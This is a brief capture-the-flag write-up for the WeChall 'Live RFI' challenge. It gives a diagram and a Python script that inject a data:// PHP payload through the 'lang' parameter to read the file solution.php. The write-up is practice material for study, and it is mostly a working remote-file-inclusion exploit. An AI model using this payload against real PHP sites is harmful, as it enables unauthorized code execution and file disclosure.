================================================================================================================
[wechall] Warchall: Live RFI
================================================================================================================

|

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4 -> step6 -> step8;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5 -> step7 -> step9;
        }
        step0 -> step1[label="index.php?lang=data://text/plain,<?php print file_get_contents('solution.php',true);?>",arrowhead="normal"];
        step3 -> step2[label="@solve",arrowhead="normal"];
    }

|


solve
================================================================================================================


.. code-block:: python

    import requests

    url = "http://rfi.warchall.net/index.php"

    params = {
        "lang": "data://text/plain,<?php print file_get_contents('solution.php',true);?>"
    }

    r = requests.get(url, params=params, verify=False)
    print r.content
